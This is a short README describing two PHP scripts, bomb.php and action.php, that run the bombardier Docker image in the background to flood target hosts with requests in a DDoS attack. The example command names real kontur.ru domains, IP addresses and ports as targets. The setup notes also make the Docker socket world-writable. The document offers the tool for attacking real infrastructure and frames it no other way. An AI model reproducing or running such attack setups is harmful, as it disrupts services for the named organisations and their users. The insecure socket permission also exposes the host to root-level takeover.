There are two scripts: bomb.php and action.php

bomb.php is parsing addresses, IPs and ports from arguments of bomb.php as script from linux terminal which executing.
After parsing bomb.php sets docker command using docker-image alpine/bombardier. You can set number of requests and time
for each ddos-attack there.
Also, bomb.php is executing till there are enough memory and targets.

action.php sets up bomb.php as background process. That means you can just start command like this one:

php action.php "https://kontur.ru
46.17.203.102 (80/tcp, 443/tcp)
https://auth.kontur.ru
46.17.206.15 (80/tcp, 443/tcp)
https://ofd.kontur.ru
46.17.204.250 (443/tcp, 8080/tcp, 8081/tcp)"

and bomb.php in background is parsing targets and starting docker commands for ddos-attack

not forget!
sudo chown -R www-data:www-data /var/www
chmod 666 /var/run/docker.sock